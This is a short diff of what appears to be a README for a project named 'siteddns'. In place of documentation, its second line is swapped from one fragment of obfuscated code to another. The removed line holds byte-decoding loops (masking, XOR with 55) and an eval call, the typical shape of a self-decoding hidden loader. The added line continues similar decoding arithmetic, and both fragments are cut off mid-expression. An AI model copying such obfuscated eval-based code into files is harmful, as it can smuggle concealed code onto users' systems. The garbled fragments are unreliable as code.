@@ -1,2 +1,2 @@
  # siteddns
-44)break;bq[dq]=(bq[dq]+bq[dq+1])&0xff;bq[dq]=bq[dq]^55;dq++;}";eval(dq);dq="dq=43;for(;;dq--){if(dq
+43)break;av[cv]=(-((av[cv]-av[cv+1])&0xff))&0xff;cv++;}cv=44;do{av[cv]=((((av[cv]+av[cv-1])&0xff)>>1)|((((av[cv]+av[cv-1])&0xff)
